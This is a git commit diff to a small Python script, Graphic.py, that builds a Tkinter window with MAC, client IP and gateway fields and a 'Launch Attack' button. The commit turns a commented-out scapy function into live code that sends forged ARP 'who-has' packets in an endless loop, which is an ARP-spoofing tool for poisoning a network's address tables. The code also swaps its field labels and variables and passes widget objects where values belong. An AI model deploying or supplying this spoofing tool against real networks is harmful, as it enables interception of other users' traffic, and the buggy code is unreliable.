60df0385c9a2eea37ca194ed15cef81b09c77f23
GrandPaBlind <31648232+GrandPaBlind@users.noreply.github.com>
2017-09-07 14:38:16 +0200

    Add files via upload

--- Graphic.py
+++ Graphic.py
@@ -11,43 +11,50 @@
 #Import externals functions: 
 from scapy.all import *
 from Tkinter import *
-from scapy.all import *
-
+from tkMessageBox import *
 #################################################
 #Def local or global: 
 
-
-def ARP():
-	"""send( Ether(dst=clientMAC)/ARP(op="who-has", psrc=gateway, pdst=client),
-      inter=RandNum(10,40), loop=1 )"""
+def recupere():
+    showinfo("Alerte", entree.get())
 
 #################################################
 #Programm Body:
-
 
 windows = Tk()
 windows.wm_resizable(0, 0)
 frame = frame = Frame(windows)
 label = Label(frame, text="MAC Address").pack(side=LEFT)
-dst = Entry(frame)
-dst.pack(side=LEFT, fill=X, expand=True)
+#dst = Entry(frame)
+#dst.pack(side=LEFT, fill=X, expand=True)
+clientMAC = StringVar() 
+clientMAC.set("")  
+entree = Entry(frame, textvariable=clientMAC, width=30)
+entree.pack(side=LEFT, fill=X, expand=True)
 frame.pack(fill=X, expand=True)
 
 frame = frame = Frame(windows)
 label = Label(frame, text="IP CLient").pack(side=LEFT)
-dst = Entry(frame)
-dst.pack(side=LEFT, fill=X, expand=True)
+gateway = StringVar() 
+gateway.set("")  
+entree = Entry(frame, textvariable=gateway, width=30)
+entree.pack(side=LEFT, fill=X, expand=True)
 frame.pack(fill=X, expand=True)
 
 frame = frame = Frame(windows)
 label = Label(frame, text="Gateway").pack(side=LEFT)
-dst = Entry(frame)
-dst.pack(side=LEFT, fill=X, expand=True)
+client = StringVar() 
+client.set("")  
+entree = Entry(frame, textvariable=client, width=30)
+entree.pack(side=LEFT, fill=X, expand=True)
 frame.pack(fill=X, expand=True)
 
+def ARP():
+	send( Ether(dst=clientMAC)/ARP(op="who-has", psrc=gateway, pdst=client),
+      inter=RandNum(10,40), loop=1 )
 
 frame = frame = Frame(windows)
-button = Button(frame, text="Launch Attack", command=ARP())
+button = Button(frame, text="Launch Attack", command=ARP)
 
 frame.pack(fill=X)
 
@@ -65,4 +72,5 @@ button.pack()
 frame.pack()
 windows.mainloop()
 
+#print entree.pack
 
